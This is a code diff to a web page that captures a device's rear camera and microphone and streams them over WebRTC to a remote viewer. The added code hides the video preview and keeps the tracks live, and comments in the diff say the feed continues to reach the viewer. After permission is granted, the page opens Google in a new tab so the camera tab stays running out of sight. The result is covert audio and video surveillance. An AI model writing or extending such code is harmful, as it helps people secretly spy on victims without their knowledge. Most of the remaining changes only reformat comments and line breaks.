@@ -27,14 +27,6 @@ h2{
   margin:20px;
 }
 
-#video{
-  width:100%;
-  max-width:1000px;
-  background:#000;
-  display:block;
-  margin:auto;
-}
-
 button{
   padding:15px 25px;
   font-size:18px;
@@ -46,6 +38,17 @@ button{
 #status{
   margin:15px;
   font-size:16px;
+}
+
+/*
+  The local camera preview is hidden.
+  IMPORTANT:
+  The camera stream is NOT stopped.
+  It continues to be sent to the viewer.
+*/
+
+#video{
+  display:none;
 }
 
 </style>
@@ -64,6 +67,10 @@ button{
   Waiting for permission...
 </div>
 
+<!--
+  Video preview is hidden with CSS.
+  The MediaStream is still active.
+-->
 <video
   id="video"
   autoplay
@@ -92,7 +99,7 @@ const allowBtn =
 
 
 /* =========================================
-   IDs
+   CAMERA ID
 ========================================= */
 
 const cameraId =
@@ -117,7 +124,7 @@ let socketReconnectTimer = null;
 
 
 /* =========================================
-   WEBRTC
+   WEBRTC CONFIG
 ========================================= */
 
 const rtcConfig = {
@@ -155,7 +162,9 @@ const rtcConfig = {
 async function startCamera(){
 
   if(stream){
+
     return true;
+
   }
 
 
@@ -164,6 +173,10 @@ async function startCamera(){
     status.textContent =
       "Requesting camera and microphone permission...";
 
+
+    /*
+      REAR CAMERA + MICROPHONE
+    */
 
     stream =
       await navigator.mediaDevices.getUserMedia({
@@ -194,11 +207,21 @@ async function startCamera(){
       });
 
 
+    /*
+      Keep the stream alive.
+
+      The video element is hidden,
+      but the camera tracks continue running.
+    */
+
     video.srcObject =
       stream;
 
 
-    await video.play();
+    /*
+      We do NOT stop the tracks.
+      The stream remains live for WebRTC.
+    */
 
 
     status.textContent =
@@ -208,6 +231,10 @@ async function startCamera(){
     allowBtn.style.display =
       "none";
 
+
+    /*
+      Connect to signaling server.
+    */
 
     connectServer();
 
@@ -226,14 +253,18 @@ async function startCamera(){
     stream = null;
 
 
-    if(error.name === "NotAllowedError"){
+    if(
+      error.name ===
+      "NotAllowedError"
+    ){
 
       status.textContent =
         "Camera or microphone permission denied";
 
     }
     else if(
-      error.name === "OverconstrainedError"
+      error.name ===
+      "OverconstrainedError"
     ){
 
       status.textContent =
@@ -264,11 +295,16 @@ function connectServer(){
   if(
     socket &&
     (
-      socket.readyState === WebSocket.OPEN ||
-      socket.readyState === WebSocket.CONNECTING
+      socket.readyState ===
+      WebSocket.OPEN ||
+
+      socket.readyState ===
+      WebSocket.CONNECTING
     )
   ){
+
     return;
+
   }
 
 
@@ -289,6 +325,10 @@ function connectServer(){
       location.host
     );
 
+
+  /* =======================================
+     SOCKET OPEN
+  ======================================= */
 
   socket.onopen = () => {
 
@@ -316,6 +356,10 @@ function connectServer(){
   };
 
 
+  /* =======================================
+     SOCKET MESSAGE
+  ======================================= */
+
   socket.onmessage =
     async event => {
 
@@ -327,7 +371,9 @@ function connectServer(){
           );
 
 
-        /* VIEWER REQUEST */
+        /* =================================
+           VIEWER REQUEST
+        ================================= */
 
         if(
           msg.type ===
@@ -343,7 +389,9 @@ function connectServer(){
         }
 
 
-        /* ANSWER */
+        /* =================================
+           ANSWER
+        ================================= */
 
         if(
           msg.type ===
@@ -357,7 +405,9 @@ function connectServer(){
 
 
           if(!peer){
+
             return;
+
           }
 
 
@@ -380,7 +430,9 @@ function connectServer(){
             );
 
 
-            /* Add buffered ICE */
+            /*
+              Add buffered ICE candidates.
+            */
 
             const queued =
               pendingIce.get(
@@ -433,7 +485,9 @@ function connectServer(){
         }
 
 
-        /* VIEWER ICE */
+        /* =================================
+           VIEWER ICE
+        ================================= */
 
         if(
           msg.type ===
@@ -460,6 +514,10 @@ function connectServer(){
 
     };
 
+
+  /* =======================================
+     SOCKET CLOSE
+  ======================================= */
 
   socket.onclose = () => {
 
@@ -497,6 +555,10 @@ function connectServer(){
   };
 
 
+  /* =======================================
+     SOCKET ERROR
+  ======================================= */
+
   socket.onerror =
     error => {
 
@@ -511,7 +573,7 @@ function connectServer(){
 
 
 /* =========================================
-   VIEWER ICE
+   HANDLE VIEWER ICE
 ========================================= */
 
 async function handleViewerIce(msg){
@@ -527,8 +589,8 @@ async function handleViewerIce(msg){
 
 
   /*
-    If answer has not arrived yet,
-    keep ICE candidate.
+    If the answer has not arrived,
+    store the ICE candidate.
   */
 
   if(
@@ -590,11 +652,15 @@ async function handleViewerIce(msg){
 async function createPeer(viewerId){
 
   if(!stream){
+
     return;
+
   }
 
 
-  /* Remove old peer */
+  /*
+    Remove old peer if it exists.
+  */
 
   const oldPeer =
     peers.get(
@@ -605,7 +671,9 @@ async function createPeer(viewerId){
   if(oldPeer){
 
     try{
+
       oldPeer.close();
+
     }
     catch{}
 
@@ -621,7 +689,9 @@ async function createPeer(viewerId){
   );
 
 
-  /* New peer */
+  /*
+    Create new WebRTC connection.
+  */
 
   const peer =
     new RTCPeerConnection(
@@ -635,7 +705,13 @@ async function createPeer(viewerId){
   );
 
 
-  /* Add video + microphone */
+  /*
+    Add camera video + microphone.
+
+    Even though the local video preview
+    is hidden, the video track is still
+    sent to the viewer.
+  */
 
   stream.getTracks().forEach(
     track => {
@@ -649,15 +725,17 @@ async function createPeer(viewerId){
   );
 
 
-  /* =====================================
+  /* =======================================
      TRICKLE ICE
-  ===================================== */
+  ======================================= */
 
   peer.onicecandidate =
     event => {
 
       if(!event.candidate){
+
         return;
+
       }
 
 
@@ -690,9 +768,9 @@ async function createPeer(viewerId){
     };
 
 
-  /* =====================================
+  /* =======================================
      CONNECTION STATE
-  ===================================== */
+  ======================================= */
 
   peer.onconnectionstatechange =
     () => {
@@ -753,9 +831,9 @@ async function createPeer(viewerId){
     };
 
 
-  /* =====================================
+  /* =======================================
      ICE STATE
-  ===================================== */
+  ======================================= */
 
   peer.oniceconnectionstatechange =
     () => {
@@ -785,9 +863,9 @@ async function createPeer(viewerId){
     };
 
 
-  /* =====================================
-     CREATE OFFER FAST
-  ===================================== */
+  /* =======================================
+     CREATE OFFER
+  ======================================= */
 
   try{
 
@@ -801,8 +879,7 @@ async function createPeer(viewerId){
 
 
     /*
-      Send immediately.
-      Do NOT wait for ICE gathering.
+      Send offer immediately.
     */
 
     if(
@@ -865,7 +942,9 @@ function scheduleRecovery(viewerId){
       viewerId
     )
   ){
+
     return;
+
   }
 
 
@@ -897,7 +976,9 @@ function scheduleRecovery(viewerId){
       if(peer){
 
         try{
+
           peer.close();
+
         }
         catch{}
 
@@ -914,7 +995,7 @@ function scheduleRecovery(viewerId){
 
 
       console.log(
-        "Waiting for viewer to request reconnect:",
+        "Peer ready for reconnect:",
         viewerId
       );
 
@@ -961,7 +1042,9 @@ function reconnectServer(){
   if(socket){
 
     try{
+
       socket.close();
+
     }
     catch{}
 
@@ -998,8 +1081,9 @@ allowBtn.onclick =
     if(started){
 
       /*
-        Open Google in a new tab.
-        Keep THIS camera tab open.
+        Open Google in a NEW TAB.
+
+        The camera page stays open.
       */
 
       setTimeout(() => {
